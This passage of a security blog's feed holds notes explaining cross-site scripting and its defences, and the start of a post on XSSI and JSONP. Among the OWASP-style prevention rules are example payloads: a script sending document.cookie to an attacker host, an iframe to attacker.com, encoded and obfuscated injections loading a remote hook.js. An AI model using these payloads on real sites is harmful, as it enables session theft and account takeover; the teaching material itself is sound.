&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;if a client requests “&lt;code class=&quot;highlighter-rouge&quot;&gt;http://example.com?id=&amp;lt;script&amp;gt;alert(&quot;hello&quot;);&amp;lt;/script&amp;gt;&lt;/code&gt;”
the output will be .. ?&lt;/p&gt;

&lt;p&gt;Another input could be &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=&amp;lt;iframe%20src=http://attacker.com/&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;. When rendered this would include an iframe to the attacker server page.&lt;/p&gt;

&lt;p&gt;This is a simple example of &lt;strong&gt;Reflected Cross-Site Scripting&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;dom-based-xss&quot;&gt;DOM-based XSS&lt;/h4&gt;

&lt;p&gt;Is purely client-side. The HTTP response doesn’t change.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The attacker crafts a URL containing a malicious string and sends it to the victim.&lt;/li&gt;
  &lt;li&gt;The victim is tricked by the attacker into requesting the URL from the website.&lt;/li&gt;
  &lt;li&gt;The website receives the request, but does not include the malicious string in the response.&lt;/li&gt;
  &lt;li&gt;The victim’s browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.&lt;/li&gt;
  &lt;li&gt;The victim’s browser executes the malicious script inserted into the page, sending the victim’s cookies to the attacker’s server.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://bestrockers.ddns.net/res/dom-based-xss.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In DOM-based XSS, the malicious JavaScript is executed at some point after the page has loaded, as a result of the page’s legitimate JavaScript treating user input in an unsafe way.&lt;/p&gt;

&lt;p&gt;DOM-based XSS are &lt;strong&gt;invisible to server&lt;/strong&gt;. If the malicious string is contained in a URL fragment identifier (after &lt;strong&gt;#&lt;/strong&gt; ) then that part of URL will &lt;strong&gt;never leave the browser&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Other user input that is invisible to the server includes new HTML5 features like &lt;em&gt;LocalStorage&lt;/em&gt; and &lt;em&gt;IndexedDB&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;In more secure scenarios there will be a &lt;strong&gt;WAF&lt;/strong&gt; or &lt;em&gt;Web Application Firewall&lt;/em&gt; configured to match XSS payloads and block the request.&lt;/p&gt;

&lt;h3 id=&quot;what-is-the-aim-of-malicious-javascript&quot;&gt;What is the aim of malicious Javascript?&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cookie theft&lt;/strong&gt;: cookies are the most common mechanism for authentication and state maintainment under multiple HTTP requests. If an attacker is able to retrieve a cookie for an authorized client, he could impersonate him.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Keylogging&lt;/strong&gt;: an event listener can be registered and every input can be sent to the attacker’s own server. It is as simple as an &lt;em&gt;addEventListener&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Phishing&lt;/strong&gt;: fake form login, DOM manipulation&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;example-attack-scenario&quot;&gt;Example attack scenario&lt;/h3&gt;
&lt;p&gt;If a website has low security policy (no CSP, no XSS, no secure Cookie) the simplest way to thieve a cookie is to make a request to the attacker’s own server.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;
window.location='http://attacker/?cookie='+document.cookie
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scenario:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Ada is connected to a website vulnerable of Stored XSS&lt;/li&gt;
  &lt;li&gt;The page is loaded and the script is executed into the Ada Browser&lt;/li&gt;
  &lt;li&gt;Ada makes a request to another origin including cookies from the actual origin.&lt;/li&gt;
  &lt;li&gt;Attacker get Ada’s cookie logged.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No security was in place.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No user sanitization on Comment management.&lt;/li&gt;
  &lt;li&gt;Cookie HttpOnly flag not used.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;7-xss-examples&quot;&gt;7. XSS Examples&lt;/h2&gt;

&lt;p&gt;HTML based&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;body onload=alert('test1')&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;b onmouseover=alert('Wufff!')&amp;gt;click me!&amp;lt;/b&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Script Via Encoded URI Schemes&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;IMG SRC=j&amp;amp;#X41vascript:alert('test2')&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;code encoding&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot;
CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;cookie theft&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;SCRIPT type=&quot;text/javascript&quot;&amp;gt;
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;how-to-contrast-xss&quot;&gt;How to contrast XSS&lt;/h3&gt;
&lt;p&gt;XSS is a type of &lt;strong&gt;code injection&lt;/strong&gt; –&amp;gt; input must be secured.
You MUST use the escape syntax for the part of the HTML document you’re putting untrusted data into.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Encoding&lt;/strong&gt;: escape user input&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Validation&lt;/strong&gt;: filter input from malicious commands&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Input context:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Context&lt;/th&gt;
      &lt;th&gt;Example&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HTML element content&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;div&amp;gt;userInput&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;HTML attribute value&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input value=&quot;userInput&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;URL query value&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://example.com/?parameter=userInput&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CSS value&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;color: userInput&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;JavaScript value&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;var name = &quot;userInput&quot;;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;If user input is inserted directly into the HTML then:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Application code&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input value=&quot;userInput&quot;&amp;gt;&lt;/code&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Malicious String&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&amp;lt;input value=&quot;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input value=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&amp;lt;input value=&quot;&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;To avoid this, just &lt;strong&gt;sanitize input&lt;/strong&gt; (client and server side), and remove quotation marks.&lt;/p&gt;

&lt;h3 id=&quot;encoding&quot;&gt;Encoding&lt;/h3&gt;
&lt;p&gt;Encoding is the act of &lt;strong&gt;escaping&lt;/strong&gt; user input so that the browser interprets it only as data, not as code.&lt;/p&gt;

&lt;p&gt;Ex: HTML escaping, which converts characters like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; into &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;lt;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/code&gt; would become &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;lt;script&amp;amp;gt;...&amp;amp;lt;/script&amp;amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;JavaScript encodeURIComponent():&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://w3schools.com/my test.asp?name=ståle&amp;amp;car=saab&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;results in:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https%3A%2F%2Fw3schools.com%2Fmy%20test.asp%3Fname%3Dst%C3%A5le%26car%3Dsaab&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;validation&quot;&gt;Validation&lt;/h3&gt;
&lt;p&gt;Allow some HTML elements (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;em&amp;gt;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;strong&amp;gt;&lt;/code&gt;) but disallowing others (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;).&lt;/p&gt;

&lt;h2 id=&quot;8-url-obfuscation&quot;&gt;8. URL Obfuscation&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;URL shortener&lt;/li&gt;
  &lt;li&gt;URL redirector&lt;/li&gt;
  &lt;li&gt;URL/ASCII Encoding&lt;/li&gt;
  &lt;li&gt;adding extra irrilevant query parameter&lt;/li&gt;
  &lt;li&gt;converting domain into an integer –&amp;gt; http://4231939341&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://browservictim.com/page.html?id=1');eval(String.fromCharCode(115,
61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,10
9,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61
,39,104,116,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,10
1,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,1
09,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,9
7,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,10
1,110,100,67,104,105,108,100,40,115,41,59))//
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;will be interpreted in&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://browservictim.com/page.html?id=1');s=document.createElement('script');s.src='http://browserhacker.com/hook.js';document.getElementsByTagName('head')[0].appendChild(s);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;thanks to the use of &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;String.fromCharCode&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;9-owasp-xss-prevention-rules&quot;&gt;9. OWASP XSS Prevention rules&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Never Insert Untrusted Data Except in Allowed Locations&lt;/strong&gt;: deny all, don’t put untrusted data into HTML document/tag  and nested contexts. Example:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;...NEVER PUT UNTRUSTED DATA HERE...&amp;lt;/script&amp;gt;   directly in a script
&amp;lt;!--...NEVER PUT UNTRUSTED DATA HERE...--&amp;gt;             inside an HTML comment
&amp;lt;div ...NEVER PUT UNTRUSTED DATA HERE...=test /&amp;gt;       in an attribute name
&amp;lt;NEVER PUT UNTRUSTED DATA HERE... href=&quot;/test&quot; /&amp;gt;   in a tag name
&amp;lt;style&amp;gt;...NEVER PUT UNTRUSTED DATA HERE...&amp;lt;/style&amp;gt;   directly in CSS
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;HTML Escape Before Inserting Untrusted Data into HTML Element Content&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;body&amp;gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&amp;lt;/body&amp;gt;
&amp;lt;div&amp;gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Escape the following characters with HTML entity encoding:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp; --&amp;gt; &amp;amp;amp;
&amp;lt; --&amp;gt; &amp;amp;lt;
&amp;gt; --&amp;gt; &amp;amp;gt;
&quot; --&amp;gt; &amp;amp;quot;
' --&amp;gt; &amp;amp;#x27;
/ --&amp;gt; &amp;amp;#x2F;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes&lt;/strong&gt;:is for putting untrusted data into typical attribute values like width, name, value, etc&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;div attr=&quot;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&quot;&amp;gt;content&amp;lt;/div&amp;gt;   inside double quoted attribute
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Escape all characters with ASCII values less than 256 with the &amp;amp;#xHH; format&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values&lt;/strong&gt;: for dynamically generated JavaScript code&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'&amp;lt;/script&amp;gt;          one side of a quoted expression
&amp;lt;div onmouseover=&quot;x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'&quot;&amp;lt;/div&amp;gt;  inside quoted event handler
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Some JavaScript functions can never safely use untrusted data as input - EVEN IF JAVASCRIPT ESCAPED!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
window.setInterval('...EVEN IF YOU ESCAPE UNTRUSTED DATA YOU ARE XSSED HERE...');
 &amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values&lt;/strong&gt;: You should stay away from putting untrusted data into complex properties like url, behavior, and custom (-moz-binding)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;style&amp;gt;selector { property : &quot;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&quot;; } &amp;lt;/style&amp;gt;   property value
&amp;lt;span style=&quot;property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&quot;&amp;gt;text&amp;lt;/span&amp;gt;       property value
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;background-url&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;javascript:alert(1)&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;other&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;URLs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;text-size:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;expression(alert('XSS'))&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;only&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;IE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values&lt;/strong&gt;:when you want to put untrusted data into HTTP GET parameter value.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&quot;&amp;gt;link&amp;lt;/a &amp;gt;       
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Sanitize HTML Markup with a Library Designed for the Job&lt;/strong&gt;: like &lt;em&gt;&lt;a href=&quot;https://github.com/mganss/HtmlSanitizer&quot;&gt;HtmlSanitizer&lt;/a&gt;&lt;/em&gt; or &lt;em&gt;&lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project&quot;&gt;OWASP Java HTML Sanitizer&lt;/a&gt;&lt;/em&gt; or &lt;em&gt;&lt;a href=&quot;http://htmlpurifier.org/&quot;&gt;PHP HTML Purifier&lt;/a&gt;&lt;/em&gt; or others.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-JavaScript&quot;&gt;var sanitizer = new HtmlSanitizer();
sanitizer.AllowedAttributes.Add(&quot;class&quot;);
var sanitized = sanitizer.Sanitize(html);
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet&quot;&gt;Prevent DOM-based XSS&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Use HTTPOnly cookie flag&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Implement Content Security Policy (CSP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Use the X-XSS-Protection Response Header&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;To defend:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;HTML encode: i.e. Convert &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Strictly validate unsafe Attributes&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;URL encode: percent encoding&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;URL validation&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attribute encode: escape characters with the HTML Entity &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#xHH;&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CSS Hex encode: scaping supports &lt;code class=&quot;highlighter-rouge&quot;&gt;\XX&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;\XXXXXX&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Javascript encoding/escaping: escape all characters with the &lt;code class=&quot;highlighter-rouge&quot;&gt;\uXXXX&lt;/code&gt; unicode escaping format&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;more info at: [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)&lt;em&gt;Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS&lt;/em&gt;(Cross_Site_Scripting_Prevention_Cheat_Sheet)&lt;/p&gt;

&lt;hr /&gt;
</description>
        <pubDate>Thu, 26 Apr 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/notes/sop-xss-introduction/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/notes/sop-xss-introduction/</guid>
        
        
        <category>notes</category>
        
      </item>
    
      <item>
        <title>XSSI and XSS differences</title>
        <description>&lt;h1 id=&quot;difference-between-xssi-and-xsscsrf&quot;&gt;Difference between XSSI and XSS/CSRF&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;During an XSS malicious code is placed into a victim’s page, during an XSSI &lt;strong&gt;victim’s code is included in a malicious page&lt;/strong&gt;. On the surface XSSI and CSRF look similar, because in both a request is sent from a malicious page to a different domain and in both cases the request is executed in the context of the logged in user. The key difference is the goal. In a CSRF, the attacker wants to execute state-changing actions inside a victim’s page, like transferring money in an online banking application. &lt;strong&gt;&lt;em&gt;In an XSSI the attacker wants to leak data cross-origin&lt;/em&gt;&lt;/strong&gt;, in order to then execute one of the aforementioned attacks.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;More ref at &lt;a href=&quot;https://www.scip.ch/en/?labs.20160414&quot;&gt;https://www.scip.ch/en/?labs.20160414&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Generally devs use JSONP (see below) to bypass SOP and include resources from esternal sites.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is JSONP? or JSON with Padding&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;JSONP is a method for sending JSON data &lt;strong&gt;&lt;em&gt;without worrying about cross-domain issues&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;JSONP does not use the XMLHttpRequest object.&lt;/li&gt;
  &lt;li&gt;JSONP uses the &lt;script&gt; tag instead&lt;/script&gt;&lt;/li&gt;
  &lt;li&gt;THE &lt;strong&gt;SOP&lt;/strong&gt; IS NOT WORKING HERE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Server Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
$myJSON = '{ &quot;name&quot;:&quot;John&quot;, &quot;age&quot;:30, &quot;city&quot;:&quot;New York&quot; }';

echo &quot;myFunc(&quot;.$myJSON.&quot;);&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This will return: myFunc({ “name”:”John”, “age”:30, “city”:”New York” });&lt;/p&gt;

&lt;p&gt;This could be included in a dynamically created &lt;code class=&quot;highlighter-rouge&quot;&gt;script&lt;/code&gt; tag:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function clickButton() {
    var s = document.createElement(&quot;script&quot;);
    s.src = &quot;demo_jsonp.php&quot;;
    document.body.appendChild(s);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And, having a function called myFunc already defined client-side, this will execute the server instruction in the client browser.&lt;/p&gt;

&lt;h1 id=&quot;so-what-is-xssi&quot;&gt;So what is XSSI&lt;/h1&gt;

